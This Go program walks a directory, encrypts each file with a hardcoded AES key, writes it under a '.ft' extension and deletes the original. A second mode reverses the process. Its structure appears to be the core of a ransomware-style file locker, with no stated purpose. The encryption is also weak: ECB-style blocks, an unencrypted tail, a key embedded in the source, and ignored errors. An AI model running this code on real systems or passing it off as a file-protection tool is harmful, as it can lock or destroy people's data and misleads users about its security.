package main

import (
	"crypto/aes"
	"io/ioutil"
	"fmt"
	"os"
	"path/filepath"
	"log"
)

var key_aes = [16]byte{226, 97, 2, 136, 60, 123, 178, 35, 125, 144, 94, 0, 12, 164, 58, 23}

func aes_en64(data []byte) []byte {
	cipher, err := aes.NewCipher(key_aes[:])
	if err != nil {
		fmt.Println(err)
	}
	data_encrypted := make([]byte, 16 * (len(data)/16))
	var i int;
	for i = 0; i < len(data_encrypted)/16; i++ {
		cipher.Encrypt(data_encrypted[i*16:(i+1)*16], data[i*16:(i+1)*16])
	}
	data_encrypted = append(data_encrypted, data[i*16:]...)
	return data_encrypted
}

func aes_de64(data []byte) []byte {
	cipher, err := aes.NewCipher(key_aes[:])
	if err != nil {
		log.Fatal(err)
	}
	data_decrypted := make([]byte, 16 * (len(data)/16))
	var i int;
	for i = 0; i < len(data_decrypted)/16; i++ {
		cipher.Decrypt(data_decrypted[i*16:(i+1)*16], data[i*16:(i+1)*16])
	}
	data_decrypted = append(data_decrypted, data[i*16:]...)
	return data_decrypted
}

func main() {
	err := filepath.Walk(os.Args[2], func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Fatal(err)
		}
		if !info.IsDir() {
			file, _ := ioutil.ReadFile(path)
			if (os.Args[1] == "en") {
				ioutil.WriteFile(path + ".ft", aes_en64([]byte(file)), 0600)
			} else {
				ioutil.WriteFile(path[0:len(path) - 3], aes_de64([]byte(file)), 0600)
			}
			os.Remove(path)
		}
		return nil
	})
	if err != nil {
		log.Fatal(err)
	}
}